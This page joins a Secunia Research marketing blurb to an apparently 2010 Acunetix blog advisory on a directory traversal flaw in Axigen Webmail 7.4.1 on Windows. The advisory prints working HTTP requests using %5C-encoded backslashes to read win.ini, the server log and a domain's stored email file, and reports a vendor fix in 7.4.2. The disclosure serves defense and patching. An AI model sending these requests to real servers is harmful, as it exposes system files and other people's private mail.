How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

[![](https://cdn.acunetix.com/wp_content/uploads/2010/09/axigen.png "axigen")](https://cdn.acunetix.com/wp_content/uploads/2010/09/axigen.png)We are continuing with the list of security vulnerabilities found in a number of web applications while testing our latest version of [Acunetix WVS v7](https://www.acunetix.com/blog/releases/acunetix-7-web-security-easier-cost-effective/) . In this blog post, we will look into the details of a very serious web vulnerability discovered by Acunetix WVS in Axigen.

> Axigen is an integrated email, calendaring & collaboration platform, masterfully built on our unique Linux mail server technology, for increased speed & security.

Axigen Webmail version 7.4.1 is vulnerable to a [directory traversal vulnerability](https://www.acunetix.com/websitesecurity/directory-traversal/). Only Axigen installations running on Windows platforms are affected. By URL encoding the **“”** character to **%5C** it’s possible to bypass the directory traversal protection available in this application. Our scanner reported the following alert:

[![](https://cdn.acunetix.com/wp_content/uploads/2010/09/alert-150x150.png "Acunetix WVS directory traversal alert")](https://cdn.acunetix.com/wp_content/uploads/2010/09/alert.png)

By requesting the following URL (/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini) it’s possible to read the contents of file c:windowswin.ini. Using this encoding trick it’s possible to traverse directories and see the contents of any file that is readable by the web server user.

Here is a sample HTTP request:

```
GET http://192.168.0.222:80/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1
Cookie: webmailSession=0; cookieTest=cookiesEnabled; checkOverQuota=0; passwordExpireWarning=0
Host: 192.168.0.222:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
```

[![](https://cdn.acunetix.com/wp_content/uploads/2010/09/screenshot-150x150.png "Acunetix WVS HTTP Editor penetration testing tool")](https://cdn.acunetix.com/wp_content/uploads/2010/09/screenshot.png)

While investigating this alert, I’ve discovered that this vulnerability is more serious than I initially expected. This is a very serious vulnerability because using information from the log files it’s possible to gather enough information to read the file containing all the emails from all the domains hosted on the server.

For, example, using an HTTP request like:

```
GET /..%5c..%5c/log/everything.txt HTTP/1.0
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
Host: 192.168.0.222
Connection: Close
Pragma: no-cache
```

you can access the log file. From here you get determine the domain name and using this information you can read the file containing all the emails from this domain:

```
GET /..%5c..%5c/domains/localdomain/00.hsf HTTP/1.0
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
Host: 192.168.0.222
Connection: Close
Pragma: no-cache
```

This vulnerability was reported to the Axigen team on 22/7/2010 via the support system on their website and they were fixed in Axigen version 7.4.2. If you are using Axigen, download the latest version from their website. The changelog is available [here](http://www.axigen.com/press/product-releases/axigen-releases-version-742_74.html).
